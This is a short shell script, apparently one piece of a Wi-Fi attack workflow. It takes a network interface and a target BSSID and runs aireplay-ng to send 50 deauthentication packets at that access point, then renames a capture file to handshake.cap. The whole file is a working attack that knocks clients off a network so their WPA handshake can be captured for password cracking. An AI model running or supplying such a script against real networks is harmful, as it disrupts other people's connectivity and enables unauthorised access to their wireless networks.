if [ $# -ne 2 ]
then
echo "Please Enter <network_interface>  <BSSID>"
else
sudo aireplay-ng -0 50 -a $2 $1
fi
mv newcapture*.cap handshake.cap
rm newcapture*
